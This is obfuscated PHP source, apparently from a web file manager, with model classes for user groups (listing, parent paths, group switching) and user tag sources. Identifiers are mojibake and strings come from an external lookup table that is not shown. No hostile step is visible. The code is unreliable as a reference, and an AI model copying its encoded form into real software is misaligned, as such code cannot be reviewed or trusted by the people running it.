$ìÓ×û¢©) { $œÁ‹ğ±ú =& $_SERVER[…É¦À–]; $Æ­ù—´ = strtolower($Æ­ù—´); $ùî¦œ¯ = array($œÁ‹ğ±ú[94] => $±¤Öİ˜æ, $œÁ‹ğ±ú[403] => array($œÁ‹ğ±ú[412], "\x25{$Æ­ù—´}\x25")); $ùî¦œ¯ = $this->parseWhereLike($ùî¦œ¯); if ($ìÓ×û¢©) { $ùî¦œ¯[$œÁ‹ğ±ú[1877]] = array($œÁ‹ğ±ú[7], $ìÓ×û¢©); } $ú¬´ñ…æ = Model($œÁ‹ğ±ú[1976])->where($ùî¦œ¯)->limit($î¹Ø—øƒ)->select(); if (!$ú¬´ñ…æ) { return array(); } $ú¬´ñ…æ = array_to_keyvalue($ú¬´ñ…æ, $œÁ‹ğ±ú[12], $œÁ‹ğ±ú[1877]); $î‘Ú“ç = $this->where(array($œÁ‹ğ±ú[1965] => array($œÁ‹ğ±ú[7], $ú¬´ñ…æ)))->select(); if (!$î‘Ú“ç) { return array(); } return $î‘Ú“ç; } protected function _listDataApplyItem($¯®‘â½) { $õ…šì¢ = array($¯®‘â½); $this->_listDataApply($õ…šì¢); return $õ…šì¢[0]; } protected function _listDataApply(&$ô¼­Ê÷) { $¼”ŸõÖ« =& $_SERVER[…É¦À–]; if (!$ô¼­Ê÷) { return; } $Å±–¶¡— = array_to_keyvalue($ô¼­Ê÷, $¼”ŸõÖ«[12], $¼”ŸõÖ«[1877]); $this->_listAppendChildren($ô¼­Ê÷); $this->_listAppendChildrenMember($ô¼­Ê÷); $this->_listAppendMeta($ô¼­Ê÷, $Å±–¶¡—); $this->_listAppendParent($ô¼­Ê÷); $this->_listAppendSourceRoot($ô¼­Ê÷, $Å±–¶¡—); } private function _listAppendChildren(&$ñ¦ª»Œæ) { $õ£ÈĞÄ =& $_SERVER[…É¦À–]; $ÓªìÕ±± = array_to_keyvalue($ñ¦ª»Œæ, $õ£ÈĞÄ[12], $õ£ÈĞÄ[1877]); $³Œ†¯” = array($õ£ÈĞÄ[461] => array($õ£ÈĞÄ[7], $ÓªìÕ±±)); $ú»”„¦¤ = array($õ£ÈĞÄ[461], $õ£ÈĞÄ[1977] => $õ£ÈĞÄ[520]); $ªØ”Ô· = $this->field($ú»”„¦¤)->where($³Œ†¯”)->group($õ£ÈĞÄ[461])->select(); $‘µí¯·È = array_to_keyvalue($ªØ”Ô·, $õ£ÈĞÄ[461], $õ£ÈĞÄ[520]); foreach ($ñ¦ª»Œæ as &$ıòéÔØ) { $ÀÌøıÏŠ = $ıòéÔØ[$õ£ÈĞÄ[1877]]; $ıòéÔØ[$õ£ÈĞÄ[1978]] = isset($‘µí¯·È[$ÀÌøıÏŠ]) ? intval($‘µí¯·È[$ÀÌøıÏŠ]) : !1; } unset($ıòéÔØ); } private function _listAppendChildrenMember(&$¾š®Á´¸) { $‰Ëş‰¢ =& $_SERVER[…É¦À–]; $¸‚†è¶µ = array_to_keyvalue($¾š®Á´¸, $‰Ëş‰¢[12], $‰Ëş‰¢[1877]); $à«ÍëÖ‰ = array($‰Ëş‰¢[1877] => array($‰Ëş‰¢[7], $¸‚†è¶µ)); $î®ú»ˆ§ = array($‰Ëş‰¢[1877], $‰Ëş‰¢[1977] => $‰Ëş‰¢[520]); $àáÁàêÀ = Model($‰Ëş‰¢[1967])->field($î®ú»ˆ§)->where($à«ÍëÖ‰)->group($‰Ëş‰¢[1877])->select(); $—ş¹ÒŒ¤ = array_to_keyvalue($àáÁàêÀ, $‰Ëş‰¢[1877], $‰Ëş‰¢[520]); foreach ($¾š®Á´¸ as &$„¥¡õİö) { $àÓÇ‘³Î = $„¥¡õİö[$‰Ëş‰¢[1877]]; $„¥¡õİö[$‰Ëş‰¢[1979]] = isset($—ş¹ÒŒ¤[$àÓÇ‘³Î]) ? intval($—ş¹ÒŒ¤[$àÓÇ‘³Î]) : !1; } unset($„¥¡õİö); } private function _listAppendMeta(&$†ÑÕ“£õ, $‹İûğ¾š) { $İº¶Ï‰ß =& $_SERVER[…É¦À–]; $ƒ¼÷»úß = array($İº¶Ï‰ß[1877] => array($İº¶Ï‰ß[7], $‹İûğ¾š)); $Éß‚×Æ¿ = Model($İº¶Ï‰ß[1966])->where($ƒ¼÷»úß)->select(); $Éß‚×Æ¿ = array_to_keyvalue_group($Éß‚×Æ¿, $İº¶Ï‰ß[1877]); foreach ($Éß‚×Æ¿ as &$¼òŠş¹À) { $¼òŠş¹À = array_to_keyvalue($¼òŠş¹À, $İº¶Ï‰ß[94], $İº¶Ï‰ß[403]); } unset($¼òŠş¹À); foreach ($†ÑÕ“£õ as &$©¦Ç§­•) { $©¦Ç§­•[$İº¶Ï‰ß[495]] = array(); if (isset($Éß‚×Æ¿[$©¦Ç§­•[$İº¶Ï‰ß[1877]]])) { $©¦Ç§­•[$İº¶Ï‰ß[495]] = $Éß‚×Æ¿[$©¦Ç§­•[$İº¶Ï‰ß[1877]]]; } } unset($©¦Ç§­•); } protected function parentLevelArray($êœ›ßìÒ) { $…ååœ„˜ =& $_SERVER[…É¦À–]; $êœ›ßìÒ = explode($…ååœ„˜[50], trim($êœ›ßìÒ, $…ååœ„˜[50])); $êœ›ßìÒ = array_remove_value($êœ›ßìÒ, $…ååœ„˜[198]); return $êœ›ßìÒ; } protected function parentInGroup($Ş•«›ß¾, $ØÕâ˜Å£) { $Òºˆ¤¾ò =& $_SERVER[…É¦À–]; $ªõØ«È = $this->getInfoSimple($Ş•«›ß¾); if (!$ªõØ«È) { return !0; } $­«£ÌÊ¶ = $this->parentLevelArray($ªõØ«È[$Òºˆ¤¾ò[540]]); $­«£ÌÊ¶[] = $Ş•«›ß¾; foreach ($­«£ÌÊ¶ as $Ş•«›ß¾) { if (in_array($Ş•«›ß¾ . $Òºˆ¤¾ò[12], $ØÕâ˜Å£)) { return !0; } } return !1; } private function _listAppendParent(&$—ÒÁ©­×) { $›ì’É´Â =& $_SERVER[…É¦À–]; $ÆàŞµ“Á = array(); foreach ($—ÒÁ©­× as &$òñ´Ë’Ì) { $ÆàŞµ“Á[$òñ´Ë’Ì[$›ì’É´Â[1877]]] = $òñ´Ë’Ì[$›ì’É´Â[32]]; $«¦¤Ş¬‹ = $this->parentLevelArray($òñ´Ë’Ì[$›ì’É´Â[540]]); foreach ($«¦¤Ş¬‹ as $É½…şçÕ) { if (!isset($ÆàŞµ“Á[$É½…şçÕ])) { $ÆàŞµ“Á[$É½…şçÕ] = 0; } } } unset($òñ´Ë’Ì); foreach ($ÆàŞµ“Á as $²ìƒ÷Û¶ => $šœµöÆÙ) { if ($šœµöÆÙ) { continue; } $Ôó£¼É³ = $this->getInfoSimple($²ìƒ÷Û¶); $ÆàŞµ“Á[$²ìƒ÷Û¶] = $Ôó£¼É³[$›ì’É´Â[32]]; } $ƒ“°ò– = $GLOBALS[$›ì’É´Â[6]][$›ì’É´Â[89]][$›ì’É´Â[1980]]; if ($GLOBALS[$›ì’É´Â[523]] == $›ì’É´Â[88]) { $ƒ“°ò– = !1; } foreach ($—ÒÁ©­× as &$òñ´Ë’Ì) { $«¦¤Ş¬‹ = $this->parentLevelArray($òñ´Ë’Ì[$›ì’É´Â[540]]); $€ğßïòÜ = $›ì’É´Â[12]; foreach ($«¦¤Ş¬‹ as $²ìƒ÷Û¶ => $É½…şçÕ) { if ($ƒ“°ò– && $²ìƒ÷Û¶ == 0) { continue; } $€ğßïòÜ .= $ÆàŞµ“Á[$É½…şçÕ] . $›ì’É´Â[8]; } if ($«¦¤Ş¬‹) { $€ğßïòÜ .= $òñ´Ë’Ì[$›ì’É´Â[32]]; } $òñ´Ë’Ì[$›ì’É´Â[545]] = str_replace($›ì’É´Â[548], $›ì’É´Â[8], $€ğßïòÜ); } unset($òñ´Ë’Ì); } private function _listAppendSourceRoot(&$š–‘³ÆÅ, $•´Ë·éš) { $ïöú…¤Ø =& $_SERVER[…É¦À–]; $ğì£¯ëë = Model($ïöú…¤Ø[865])->listSourceRoot(SourceModel::TYPE_GROUP, $•´Ë·éš); $ğì£¯ëë = array_to_keyvalue($ğì£¯ëë, $ïöú…¤Ø[525]); $ğì£¯ëë = array_remove_key($ğì£¯ëë, $ïöú…¤Ø[525]); foreach ($š–‘³ÆÅ as &$Ó•ÈéÀ) { $Ó•ÈéÀ[$ïöú…¤Ø[87]] = $ğì£¯ëë[$Ó•ÈéÀ[$ïöú…¤Ø[1877]]] ? $ğì£¯ëë[$Ó•ÈéÀ[$ïöú…¤Ø[1877]]] : array(); } unset($Ó•ÈéÀ); } protected function groupMerge($ì´÷•úù) { $ì´÷•úù = array_values(array_unique($ì´÷•úù)); $ ÄÑ = array(); for ($ğ§ì÷ı– = 0; $ğ§ì÷ı– < count($ì´÷•úù); $ğ§ì÷ı–++) { $ÊîÚÊ©» = !1; for ($®”½†ƒÔ = 0; $®”½†ƒÔ < count($ì´÷•úù); $®”½†ƒÔ++) { if ($ğ§ì÷ı– == $®”½†ƒÔ) { continue; } if ($this->isParentOf($ì´÷•úù[$®”½†ƒÔ], $ì´÷•úù[$ğ§ì÷ı–])) { $ÊîÚÊ©» = !0; break; } } if (!$ÊîÚÊ©») { $ ÄÑ[] = $ì´÷•úù[$ğ§ì÷ı–]; } } return $ ÄÑ; } protected function isParentOf($à×Õ¹–, $Ñõ¼ÜšÛ) { $‹È´À =& $_SERVER[…É¦À–]; if (!$à×Õ¹– || !$Ñõ¼ÜšÛ || $à×Õ¹– == $Ñõ¼ÜšÛ) { return !1; } $µ•®€¶Ú = $this->getInfoSimple($à×Õ¹–); $†Ù‹Ş‡ = $this->getInfoSimple($Ñõ¼ÜšÛ); $Ñ§°…´ã = $µ•®€¶Ú[$‹È´À[540]] . $à×Õ¹– . $‹È´À[50]; if (substr($†Ù‹Ş‡[$‹È´À[540]], 0, strlen($Ñ§°…´ã)) == $Ñ§°…´ã) { return !0; } return !1; } public function groupShowRoot($à“ß°è­, $ğ¾Âõ×Ì = false) { $¼í¾öŞ =& $_SERVER[…É¦À–]; $æã…¸Ñå = $this->getInfo($à“ß°è­); if (!$æã…¸Ñå) { return array(); } $Úíéô = $this->parentLevelArray($æã…¸Ñå[$¼í¾öŞ[540]]); $†úÃ˜÷¥ = array($à“ß°è­); if (count($Úíéô) == 0) { return $†úÃ˜÷¥; } if ($ğ¾Âõ×Ì && count($Úíéô) == 1) { return $†úÃ˜÷¥; } if (!$æã…¸Ñå[$¼í¾öŞ[495]] || !isset($æã…¸Ñå[$¼í¾öŞ[495]][$¼í¾öŞ[1963]]) || $æã…¸Ñå[$¼í¾öŞ[495]][$¼í¾öŞ[1963]] == $¼í¾öŞ[1932]) { return $this->groupShowRoot($Úíéô[count($Úíéô) - 1], $ğ¾Âõ×Ì); } if ($æã…¸Ñå[$¼í¾öŞ[495]][$¼í¾öŞ[1963]] == $¼í¾öŞ[386]) { $ı»ĞËŸ = explode($¼í¾öŞ[50], $æã…¸Ñå[$¼í¾öŞ[495]][$¼í¾öŞ[1964]]); if ($ı»ĞËŸ) { $†úÃ˜÷¥ = array_merge($†úÃ˜÷¥, $ı»ĞËŸ); } } return $†úÃ˜÷¥; } protected function resetParentLevel() { $ßéüÌı =& $_SERVER[…É¦À–]; $¹–ğÌÖ½ = $ßéüÌı[1877]; $³çèªœÄ = $this->select(); $³çèªœÄ = array_to_keyvalue($³çèªœÄ, $¹–ğÌÖ½); foreach ($³çèªœÄ as $š•…¨™) { $øœúÈŒ = $š•…¨™; $²°½À§­ = array(); while ($øœúÈŒ[$ßéüÌı[461]] != 0) { $²°½À§­[] = $øœúÈŒ[$ßéüÌı[461]]; $øœúÈŒ = $³çèªœÄ[$øœúÈŒ[$ßéüÌı[461]]]; } $²°½À§­[] = 0; $²°½À§­ = $ßéüÌı[50] . implode($ßéüÌı[50], array_reverse($²°½À§­)) . $ßéüÌı[50]; $this->setNamePinyin($š•…¨™[$¹–ğÌÖ½], $š•…¨™[$ßéüÌı[32]]); $this->where(array($¹–ğÌÖ½ => $š•…¨™[$¹–ğÌÖ½]))->save(array($ßéüÌı[609] => $²°½À§­)); } return $³çèªœÄ; } public function groupNameAuto($ñ‰ššÓ, $¤å¤ğ é) { $ù„éëäî =& $_SERVER[…É¦À–]; $òøë‚ıÃ = $this->where(array($ù„éëäî[430] => $ñ‰ššÓ))->getField($ù„éëäî[32], !0); if (!$òøë‚ıÃ || !in_array($¤å¤ğ é, $òøë‚ıÃ)) { return $¤å¤ğ é; } for ($ÆàòÌüÅ = 1; $ÆàòÌüÅ <= count($òøë‚ıÃ) + 1; $ÆàòÌüÅ++) { $é —®™ã = $¤å¤ğ é . "\x28{$ÆàòÌüÅ}\51"; if (!in_array($é —®™ã, $òøë‚ıÃ)) { return $é —®™ã; } } } public function groupSwitch($‰×ôÒ¦Ş, $—óÍ©¹©) { $ÓÅ»‡ïù =& $_SERVER[…É¦À–]; $ìÂÁÄß = array($ÓÅ»‡ïù[1877] => array($ÓÅ»‡ïù[7], array($‰×ôÒ¦Ş, $—óÍ©¹©))); $ûïû£Ö¤ = $this->where($ìÂÁÄß)->select(); $ûïû£Ö¤ = array_to_keyvalue($ûïû£Ö¤, $ÓÅ»‡ïù[1877]); if (!isset($ûïû£Ö¤[$‰×ôÒ¦Ş]) || !isset($ûïû£Ö¤[$—óÍ©¹©]) || $ûïû£Ö¤[$‰×ôÒ¦Ş][$ÓÅ»‡ïù[461]] == 0) { return !1; } $ìÂÁÄß = array($ÓÅ»‡ïù[1877] => $‰×ôÒ¦Ş); $ãõÃî·€ = Model($ÓÅ»‡ïù[1967])->where($ìÂÁÄß)->select(); if (!$ãõÃî·€) { $ãõÃî·€ = array(); } foreach ($ãõÃî·€ as $€ÇãÌà­) { $«ÊØıæĞ = $€ÇãÌà­[$ÓÅ»‡ïù[1687]]; $ìÂÁÄß = array($ÓÅ»‡ïù[1687] => $«ÊØıæĞ, $ÓÅ»‡ïù[1877] => $—óÍ©¹©); $«Ğ™Ãş = Model($ÓÅ»‡ïù[1967])->where($ìÂÁÄß)->find(); if (!$«Ğ™Ãş) { $¹ıÁ³¢ = array($—óÍ©¹© => $€ÇãÌà­[$ÓÅ»‡ïù[1981]]); Model($ÓÅ»‡ïù[554])->userGroupAdd($«ÊØıæĞ, $¹ıÁ³¢); } Model($ÓÅ»‡ïù[554])->userGroupRemove($«ÊØıæĞ, $‰×ôÒ¦Ş); } $ìÂÁÄß = array($ÓÅ»‡ïù[440] => 2, $ÓÅ»‡ïù[461] => 0, $ÓÅ»‡ïù[439] => 1, $ÓÅ»‡ïù[525] => array($ÓÅ»‡ïù[7], array($‰×ôÒ¦Ş, $—óÍ©¹©))); $û„ßš°¹ = Model($ÓÅ»‡ïù[865])->where($ìÂÁÄß)->field($ÓÅ»‡ïù[1982])->select(); $û„ßš°¹ = array_to_keyvalue($û„ßš°¹, $ÓÅ»‡ïù[525], $ÓÅ»‡ïù[431]); $Ÿ®îÍ˜¹ = !empty($û„ßš°¹[$‰×ôÒ¦Ş]) ? $û„ßš°¹[$‰×ôÒ¦Ş] : !1; if ($Ÿ®îÍ˜¹) { if (!$û„ßš°¹[$—óÍ©¹©]) { $û„ßš°¹[$—óÍ©¹©] = Model($ÓÅ»‡ïù[865])->groupRootAdd($—óÍ©¹©); } $Í¯½ Ñ = $û„ßš°¹[$—óÍ©¹©]; $ìÂÁÄß = array($ÓÅ»‡ïù[461] => $Ÿ®îÍ˜¹); $û„ßš°¹ = Model($ÓÅ»‡ïù[865])->where($ìÂÁÄß)->field($ÓÅ»‡ïù[1983])->select(); if (!$û„ßš°¹) { $û„ßš°¹ = array(); } Model($ÓÅ»‡ïù[865])->moveClearAuth = !1; foreach ($û„ßš°¹ as $¶à»À‘Ê) { $Ñàòø× = $¶à»À‘Ê[$ÓÅ»‡ïù[439]] == $ÓÅ»‡ïù[88] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ÓÅ»‡ïù[865])->move($¶à»À‘Ê[$ÓÅ»‡ïù[431]], $Í¯½ Ñ, $Ñàòø×); } Model($ÓÅ»‡ïù[865])->moveClearAuth = !0; $ìÂÁÄß = array($ÓÅ»‡ïù[440] => 2, $ÓÅ»‡ïù[525] => $‰×ôÒ¦Ş); $¶Ëşå‰ô = array($ÓÅ»‡ïù[525] => $—óÍ©¹©); Model($ÓÅ»‡ïù[1984])->where($ìÂÁÄß)->save($¶Ëşå‰ô); Model($ÓÅ»‡ïù[1985])->where($ìÂÁÄß)->save($¶Ëşå‰ô); } $this->_changeChildLevel($ûïû£Ö¤[$‰×ôÒ¦Ş], $ûïû£Ö¤[$—óÍ©¹©], !0); $this->where(array($ÓÅ»‡ïù[461] => $‰×ôÒ¦Ş))->save(array($ÓÅ»‡ïù[461] => $—óÍ©¹©)); $this->_clearChildrenCache($ûïû£Ö¤[$—óÍ©¹©]); return !0; } } goto F¸¥¥§®İÔ; DèšÉ‡Õ¯¸: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\x65\x72\137\x66\141\166"; protected function cacheFunctionAlias($Å—›­€) { $è¹ŒÄŒ³ =& $_SERVER[…É¦À–]; return array($è¹ŒÄŒ³[1988] => array($è¹ŒÄŒ³[2372] . USER_ID, $è¹ŒÄŒ³[1989])); } protected function listData() { $çèşÛî© =& $_SERVER[…É¦À–]; $Ÿ»‘¢Äş = array($çèşÛî©[1678] => USER_ID, $çèşÛî©[512] => array($çèşÛî©[1992], 0)); $ÜÀÊš¾ = $çèşÛî©[2373]; $Ç‹Îõô² = $this->field($ÜÀÊš¾)->where($Ÿ»‘¢Äş)->order($çèşÛî©[1995])->select(); return $Ç‹Îõô² ? $Ç‹Îõô² : array(); } protected function addToTag($¨Ä˜Ï¤Á, $¤éÒ·÷„) { $«„‘‚âª =& $_SERVER[…É¦À–]; if (!Model($«„‘‚âª[2137])->listData($¤éÒ·÷„)) { return !1; } if (is_numeric($¨Ä˜Ï¤Á)) { $’•ø¸şä = Model($«„‘‚âª[865])->pathInfo($¨Ä˜Ï¤Á); if (!$’•ø¸şä) { return !1; } } else { $’•ø¸şä = IO::infoSimple($¨Ä˜Ï¤Á); if (!$’•ø¸şä) { return !1; } $ç»ˆÔÉÒ = $’•ø¸şä[$«„‘‚âª[32]]; $¿óò÷ = $’•ø¸şä[$«„‘‚âª[33]]; if (isset($’•ø¸şä[$«„‘‚âª[439]])) { $¿óò÷ = $’•ø¸şä[$«„‘‚âª[439]] == $«„‘‚âª[88] ? $«„‘‚âª[75] : $«„‘‚âª[200]; } } $ßæï”ˆµ = array($«„‘‚âª[1678] => USER_ID, $«„‘‚âª[512] => $¤éÒ·÷„, $«„‘‚âª[450] => $¨Ä˜Ï¤Á, $«„‘‚âª[451] => $¿óò÷ ? $¿óò÷ : $«„‘‚âª[445], $«„‘‚âª[449] => $ç»ˆÔÉÒ ? $ç»ˆÔÉÒ : $«„‘‚âª[12], $«„‘‚âª[1881] => 0); if ($this->where($ßæï”ˆµ)->find()) { return !1; } return $this->add($ßæï”ˆµ); } protected function removeFromTag($ªÓĞ–Í, $ıšŞÇ©û) { $Ä½ô¿Íè =& $_SERVER[…É¦À–]; if (!Model($Ä½ô¿Íè[2137])->listData($ıšŞÇ©û)) { return !1; } if (is_array($ªÓĞ–Í)) { $ªÓĞ–Í = array($Ä½ô¿Íè[7], $ªÓĞ–Í); } $˜¢©ûëµ = array($Ä½ô¿Íè[1678] => USER_ID, $Ä½ô¿Íè[512] => $ıšŞÇ©û, $Ä½ô¿Íè[450] => $ªÓĞ–Í); return $this->where($˜¢©ûëµ)->delete(); } protected function removeByTag($¶Ò ¹ªº) { $•À‚ãÖÓ =& $_SERVER[…É¦À–]; if (!$¶Ò ¹ªº) { return !1; } $“ ÔÁøà = array($•À‚ãÖÓ[1678] => USER_ID, $•À‚ãÖÓ[512] => $¶Ò ¹ªº); return $this->where($“ ÔÁøà)->delete(); } protected function removeBySource($£™øÜ±‡) { $„ª¼µ‚ =& $_SERVER[…É¦À–]; if (is_array($£™øÜ±‡)) { $£™øÜ±‡ = array($„ª¼µ‚[7], $£™øÜ±‡); } $Ù²ª«¤‘ = array($„ª¼µ‚[1678] => USER_ID, $„ª¼µ‚[512] => array($„ª¼µ‚[1059], 0), $„ª¼µ‚[450] => $£™øÜ±‡); return $this->where($Ù²ª«¤‘)->delete(); } }